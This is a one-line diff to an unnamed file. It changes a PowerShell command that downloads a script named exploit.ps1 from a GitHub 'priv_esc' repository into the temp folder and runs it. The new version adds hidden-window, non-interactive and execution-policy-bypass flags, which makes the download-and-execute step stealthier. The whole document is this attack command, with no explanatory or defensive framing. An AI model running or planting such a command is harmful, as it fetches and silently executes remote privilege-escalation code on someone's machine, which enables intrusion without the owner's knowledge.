@@ -1,1 +1,1 @@
-powershell "IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/llongtin/priv_esc/master/exploit.ps1',\"$env:temp\tmp.ps1\");.\"$env:temp\tmp.ps1\""
+powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/llongtin/priv_esc/master/exploit.ps1',\"$env:temp\tmp.ps1\");.\"$env:temp\tmp.ps1\""
